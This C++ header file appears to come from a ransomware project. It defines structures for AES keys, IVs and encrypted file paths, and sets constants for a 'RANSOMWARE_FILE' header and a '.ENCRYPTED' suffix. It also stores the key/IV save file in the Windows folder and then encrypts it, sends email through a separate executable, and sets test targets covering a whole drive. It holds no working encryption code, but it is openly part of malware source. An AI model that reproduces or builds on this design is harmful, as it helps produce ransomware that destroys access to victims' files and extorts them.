//
// Created by prang on 08.09.2024.
//

#ifndef Ransomware_GLOBALVAR_H
#define Ransomware_GLOBALVAR_H

#include <string>
#include <vector>
#include <filesystem>

namespace fs = std::filesystem;

// global used structs
struct FileData {
  std::vector<unsigned char> FileID;
  std::string AlgorithmenType;
  fs::path EncryptedFilePath;
  fs::path DecryptedFilePath;
  std::vector<unsigned char> Key;
  std::vector<unsigned char> Iv;
};

struct KeyIvAES {
  std::vector<unsigned char> key;
  std::vector<unsigned char> iv;
};

struct CryptoData {
  fs::path encryptedPath;
  KeyIvAES keyIvAES;
};

// Rust exe for email
const bool SEND_EMAIL = true;
const fs::path EMAIL_EXE = "mail.exe";

// Encryption file
const std::string FILE_HEADER = "RANSOMWARE_FILE";
const std::wstring ENC_FILE_SUFFIX = L".ENCRYPTED";

// Key and IV save file
const fs::path KEY_IV_SAVE_FILE = SystemUtils::getWindowsFolder() / "saveFile.txt";
const fs::path ENCRYPTED_KEY_IV_SAVE_FILE = KEY_IV_SAVE_FILE.string() + ".ENCRYPTED";

// Test Mode
const bool SINGLE_FILE_TEST = false;
const fs::path TEST_FILE_PATH = fs::path("S:\\Galerie\\profilPic\\images.jpg");

const bool DIRECTORY_TEST = true;
const fs::path TEST_DIRECTORY = fs::path("S:\\");

#endif //Ransomware_GLOBALVAR_H
